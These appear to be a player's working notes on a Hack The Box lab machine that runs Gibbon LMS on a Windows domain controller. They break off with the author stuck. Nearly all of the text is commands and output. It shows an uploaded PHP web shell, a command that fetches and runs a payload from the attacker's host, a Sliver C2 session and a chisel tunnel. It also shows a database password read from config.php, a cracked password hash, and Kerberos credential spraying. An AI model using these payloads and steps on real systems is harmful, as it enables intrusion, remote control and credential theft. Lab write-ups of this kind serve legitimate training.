## HOST RECON

```
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49670/tcp open  unknown
58195/tcp open  unknown
58199/tcp open  unknown
```


## WEB RECON

- http://frizzdc.frizz.htb/home/


- http://frizzdc.frizz.htb/Gibbon-LMS/

```
 *NOTICE** Due to unplanned Pentesting by students, WES is migrating applications and tools to stronger security protocols. During this transition, Ms. Fiona Frizzle will be migrating Gibbon to utilize our Azure Active Directory SSO. Please note this might take 48 hours where your accounts will not be available. Please bear with us, and thank you for your patience. Anything that can not utilize Azure AD will use the strongest available protocols such as Kerberos. 
```
```
Powered by Gibbon v25.0.00 | © Ross Parker 2010-2025 
```


- Auth RCE (need creds) https://www.exploit-db.com/exploits/51903

- LFI https://github.com/maddsec/CVE-2023-34598

- FILE UPLOAD https://herolab.usd.de/security-advisories/usd-2023-0025/


## UPLOAD WEBSHELL

- use ```<?php echo system($_GET['cmd']); ?>``` b64 encoded as payload

```
└─$ echo "PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4K" | base64 -d
<?php echo system($_GET['cmd']); ?>
```

```
└─$ curl -v -X POST http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php -H "Host: frizzdc.frizz.htb" -d "img=image/png;asdf,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4K&path=shell.php&gibbonPersonID=0000000001"
```

```
└─$ curl -v "http://frizzdc.frizz.htb/Gibbon-LMS/shell.php?cmd=whoami"

frizz\w.webservice 
```

- urlencode rev shell payload

```
curl http://10.10.15.37:8000/xeu.exe -o xeu.exe && .\xeu.exe

curl%20http%3A%2F%2F10.10.15.37%3A8000%2Fxeu.exe%20-o%20xeu.exe%20%26%26%20.%5Cxeu.exe
```

```
sliver > sessions 

 ID         Name   Transport   Remote Address      Hostname   Username             Operating System   Locale   Last Message                            Health  
========== ====== =========== =================== ========== ==================== ================== ======== ======================================= =========
 e614c47a   xeu    http(s)     10.10.11.60:59445   frizzdc    frizz\w.Webservice   windows/amd64      en-US    Wed Mar 19 00:00:14 EDT 2025 (0s ago)   [ALIVE] 
```

## shell as w.webservice

```
sliver (xeu) > whoami

Logon ID: frizz\w.Webservice
[*] Current Token ID: frizz\w.Webservice
```

```
sliver (xeu) > info

        Session ID: e4584dde-b2d7-417a-b471-457f22c21ea6
              Name: xeu
          Hostname: frizzdc
              UUID: e0213042-ba71-f6d5-063a-5264813acc70
          Username: frizz\w.Webservice
               UID: S-1-5-21-2386970044-1145388522-2932701813-1120
               GID: S-1-5-21-2386970044-1145388522-2932701813-513
               PID: 1620
                OS: windows
           Version: Server 2016 build 20348 x86_64
            Locale: en-US
              Arch: amd64
         Active C2: https://10.10.15.37
    Remote Address: 10.10.11.60:63529
         Proxy URL: 
Reconnect Interval: 1m0s
     First Contact: Tue Mar 18 00:52:08 EDT 2025 (1m46s ago)
      Last Checkin: Tue Mar 18 00:53:52 EDT 2025 (2s ago)
```

```
sliver (xeu) > getprivs

Privilege Information for xeu.exe (PID: 1620)
---------------------------------------------

Process Integrity Level: High

Name                            Description                     Attributes
====                            ===========                     ==========
SeChangeNotifyPrivilege         Bypass traverse checking        Enabled, Enabled by Default
SeCreateGlobalPrivilege         Create global objects           Enabled, Enabled by Default
SeIncreaseWorkingSetPrivilege   Increase a process working set  Disabled
```

```
sliver (xeu) > sharp-hound-3

[*] sharp-hound-3 output:
-----------------------------------------------
Initializing SharpHound at 5:28 AM on 3/18/2025
-----------------------------------------------

Resolved Collection Methods: Group, Sessions, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container

[+] Creating Schema map for domain FRIZZ.HTB using path CN=Schema,CN=Configuration,DC=frizz,DC=htb
[+] Cache File not Found: 0 Objects in cache

[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 35 MB RAM
Status: 76 objects finished (+76 76)/s -- Using 44 MB RAM
Enumeration finished in 00:00:01.8026521
Compressing data to .\20250318052812_BloodHound.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 5:28 AM on 3/18/2025! Happy Graphing!
```

```
PS C:\xampp\htdocs\Gibbon-LMS> whoami /all

USER INFORMATION
----------------

User Name          SID                                           
================== ==============================================
frizz\w.webservice S-1-5-21-2386970044-1145388522-2932701813-1120


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                        
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.
```

```
PS C:\Users> net users

User accounts for \\FRIZZDC

-------------------------------------------------------------------------------
a.perlstein              Administrator            c.ramon                  
c.sandiego               d.hudson                 f.frizzle                
g.frizzle                Guest                    h.arm                    
J.perlstein              k.franklin               krbtgt                   
l.awesome                m.ramon                  M.SchoolBus              
p.terese                 r.tennelli               t.wright                 
v.frizzle                w.li                     w.Webservice             
The command completed successfully.
```

```
sliver (xeu) > cat config.php

*/

/**
 * Sets the database connection information.
 * You can supply an optional $databasePort if your server requires one.
 */
$databaseServer = 'localhost';
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parrot!?1';
$databaseName = 'gibbon';

/**
 * Sets a globally unique id, to allow multiple installs on a single server.
 */
$guid = '7y59n5xz-uym-ei9p-7mmq-83vifmtyey2';
```

## port forward to expose mssql server

- netstat
```
TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       InHost      
```
- ps
```
376      17   220540      61692              4040   0 mysqld                                   
```

- attacker machine
```
└─$ ./chisel server -p 9999 --reverse                                                                                
2025/03/20 02:04:22 server: Reverse tunnelling enabled
2025/03/20 02:04:22 server: Fingerprint 7pLsmEdjwLBRvqNDTgGikvABWNCOuVREPBAFk76TmVo=
2025/03/20 02:04:22 server: Listening on http://0.0.0.0:9999
2025/03/20 02:06:10 server: session#1: tun: proxy#R:3306=>3306: Listening
```

- compromised machine
```
PS C:\xampp> .\chisel.exe client 10.10.15.37:9999 R:3306:127.0.0.1:3306
.\chisel.exe client 10.10.15.37:9999 R:3306:127.0.0.1:3306
2025/03/20 06:06:10 client: Connecting to ws://10.10.15.37:9999
2025/03/20 06:06:11 client: Connected (Latency 156.6512ms)
```

- apt install mycli 
```
└─$ mycli -h localhost -P 3306 -u MrGibbonsDB -p 'MisterGibbs!Parrot!?1'
MariaDB 10.4.32
mycli 0.0.0
Home: http://mycli.net
Bug tracker: https://github.com/dbcli/mycli/issues
Thanks to the contributor - Georgy Frolov

MariaDB MrGibbonsDB@localhost:(none)> show tables;
(1046, 'No database selected')

MariaDB MrGibbonsDB@localhost:(none)> show databases;
+--------------------+
| Database           |
+--------------------+
| gibbon             |
| information_schema |
| test               |
+--------------------+

MariaDB MrGibbonsDB@localhost:(none)> use gibbon
You are now connected to database "gibbon" as user "MrGibbonsDB"
```

```
MariaDB MrGibbonsDB@localhost:(none)> select * from gibbonperson;
...

| gibbonPersonID | title | surname | firstName | preferredName | officialName  | nameInCharacters | gender      | username  | passwordStrong                                                   | passwordStrongSalt     | passwordForceReset | 
| 1              | Ms.   | Frizzle | Fiona     | Fiona         | Fiona Frizzle |                  | Unspecified | f.frizzle | 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03 | /aACFhikmNopqrRTVz2489 | N                  | Full   | Y        | 1                   | 001             | <null> | f.frizzle@frizz.htb | <null>         | <null>    | ::1           | 2024-10-29 09:28:59 |
```

- hash-identifier
```
HASH: 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03

Possible Hashs:
[+] SHA-256
[+] Haval-256

sha256($salt.$pass) 
067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489
```

```
└─$ hashcat -m 1420 frizz_hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt 

067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489:Jenni_Luvs_Magic23
```

- faketime adding 7 hours and kerberos auth 

```
└─$ faketime -f +7hr netexec ldap 10.10.11.60 -u users.txt -p 'Jenni_Luvs_Magic23' -k --continue-on-success

LDAP        10.10.11.60     389    frizzdc.frizz.htb [+] frizz.htb\f.frizzle:Jenni_Luvs_Magic23
```

```
└─$ faketime -f +7hr netexec ldap 10.10.11.60 -u f.frizzle -p Jenni_Luvs_Magic23 --query "(sAMAccountName=f.frizzle)" "" -k
LDAP        10.10.11.60     389    frizzdc.frizz.htb [*]  x64 (name:frizzdc.frizz.htb) (domain:frizz.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.60     389    frizzdc.frizz.htb [+] frizz.htb\f.frizzle:Jenni_Luvs_Magic23 
LDAP        10.10.11.60     389    frizzdc.frizz.htb [+] Response for object: CN=f.frizzle,OU=Class_Frizz,DC=frizz,DC=htb
LDAP        10.10.11.60     389    frizzdc.frizz.htb objectClass:         top person organizationalPerson user
LDAP        10.10.11.60     389    frizzdc.frizz.htb cn:                  f.frizzle
LDAP        10.10.11.60     389    frizzdc.frizz.htb sn:                  frizzle
LDAP        10.10.11.60     389    frizzdc.frizz.htb description:         Wizard in Training
LDAP        10.10.11.60     389    frizzdc.frizz.htb givenName:           fiona
LDAP        10.10.11.60     389    frizzdc.frizz.htb distinguishedName:   CN=f.frizzle,OU=Class_Frizz,DC=frizz,DC=htb
LDAP        10.10.11.60     389    frizzdc.frizz.htb instanceType:        4
LDAP        10.10.11.60     389    frizzdc.frizz.htb whenCreated:         20241029142703.0Z
LDAP        10.10.11.60     389    frizzdc.frizz.htb whenChanged:         20250321082708.0Z
LDAP        10.10.11.60     389    frizzdc.frizz.htb displayName:         fiona frizzle
LDAP        10.10.11.60     389    frizzdc.frizz.htb uSNCreated:          12773
LDAP        10.10.11.60     389    frizzdc.frizz.htb memberOf:            CN=Remote Management Users,CN=Builtin,DC=frizz,DC=htb
LDAP        10.10.11.60     389    frizzdc.frizz.htb uSNChanged:          159838
LDAP        10.10.11.60     389    frizzdc.frizz.htb name:                f.frizzle
LDAP        10.10.11.60     389    frizzdc.frizz.htb objectGUID:          0x3ce2f0fa992a9d49b81607636d645c37
LDAP        10.10.11.60     389    frizzdc.frizz.htb userAccountControl:  66048
LDAP        10.10.11.60     389    frizzdc.frizz.htb badPwdCount:         0
LDAP        10.10.11.60     389    frizzdc.frizz.htb codePage:            0
LDAP        10.10.11.60     389    frizzdc.frizz.htb countryCode:         0
LDAP        10.10.11.60     389    frizzdc.frizz.htb badPasswordTime:     133870321268436481
LDAP        10.10.11.60     389    frizzdc.frizz.htb lastLogoff:          0
LDAP        10.10.11.60     389    frizzdc.frizz.htb lastLogon:           133870322083901413
LDAP        10.10.11.60     389    frizzdc.frizz.htb pwdLastSet:          133746856234794207
LDAP        10.10.11.60     389    frizzdc.frizz.htb primaryGroupID:      513
LDAP        10.10.11.60     389    frizzdc.frizz.htb objectSid:           0x010500000000000515000000bc45468eea3d4544757acdae4f040000
LDAP        10.10.11.60     389    frizzdc.frizz.htb accountExpires:      9223372036854775807
LDAP        10.10.11.60     389    frizzdc.frizz.htb logonCount:          1889
LDAP        10.10.11.60     389    frizzdc.frizz.htb sAMAccountName:      f.frizzle
LDAP        10.10.11.60     389    frizzdc.frizz.htb sAMAccountType:      805306368
LDAP        10.10.11.60     389    frizzdc.frizz.htb userPrincipalName:   f.frizzle
LDAP        10.10.11.60     389    frizzdc.frizz.htb objectCategory:      CN=Person,CN=Schema,CN=Configuration,DC=frizz,DC=htb
LDAP        10.10.11.60     389    frizzdc.frizz.htb dSCorePropagationData: 20241029142705.0Z 16010101000001.0Z
LDAP        10.10.11.60     389    frizzdc.frizz.htb lastLogonTimestamp:  133870192280206342
```

```
└─$ faketime -f +7hr netexec ldap 10.10.11.60 -u f.frizzle -p Jenni_Luvs_Magic23 --get-sid -k                         
LDAP        10.10.11.60     389    frizzdc.frizz.htb [*]  x64 (name:frizzdc.frizz.htb) (domain:frizz.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.60     389    frizzdc.frizz.htb [+] frizz.htb\f.frizzle:Jenni_Luvs_Magic23 
LDAP        10.10.11.60     389    frizzdc.frizz.htb Domain SID S-1-5-21-2386970044-1145388522-2932701813
```


- f.frizzle is part of remote management users but I can't connect with winrm, not even with kerberos auth. evilwinrm gives me a timeout.

- ssh dont work too and give me perm denied, i dont know why



- i am try config realms to connect but not work https://www.ibm.com/docs/en/aix/7.1?topic=support-using-openssh-kerberos

```
└─$ cat /etc/krb5.conf
[libdefaults]
        default_realm = FRIZZ.HTB
[realms]
        FRIZZ.HTB = {
                kdc = frizzdc.frizz.htb
                admin_server = frizzdc.frizz.htb
                default_domain = frizz.htb
        }
[domain_realm]
        frizz.htb = FRIZZ.HTB
        .frizz.htb = FRIZZ.HTB
```

- help step bro im stuck, this machine is fucked



curl%20http%3A%2F%2F10.10.15.37%3A8000%2Fxeu2.exe%20-o%20xeu2.exe%20%26%26%20.%5Cxeu2.exe